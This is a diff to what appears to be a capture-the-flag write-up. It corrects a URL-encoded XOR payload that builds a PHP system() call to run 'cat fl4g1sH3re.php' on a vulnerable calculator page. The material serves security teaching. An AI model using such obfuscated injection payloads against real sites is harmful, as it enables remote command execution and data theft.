@@ -99,7 +99,7 @@ And, IT WORKS!!!
 Result: fl4g1sH3re.php index.php index.php
 ```
 
-Now, we just have to read flagshere.php using `%27000020000000020000%27%5E%2721%29%5E8503021%29%5E85030%27%5E%27%26%5E%5E%2B%5E%5E1%5E%28%26%5E%5E%2B%5E%5E2%5E%29%27&1=system&2=cat+fl4g1sH3re.php`
+Now, we just have to read flagshere.php using `calc=%27000020000000020000%27%5E%2721%29%5E8503021%29%5E85030%27%5E%27%26%5E%5E%2B%5E%5E1%5E%28%26%5E%5E%2B%5E%5E2%5E%29%27&1=system&2=cat+fl4g1sH3re.php`
 
 There it is:
 ``` php
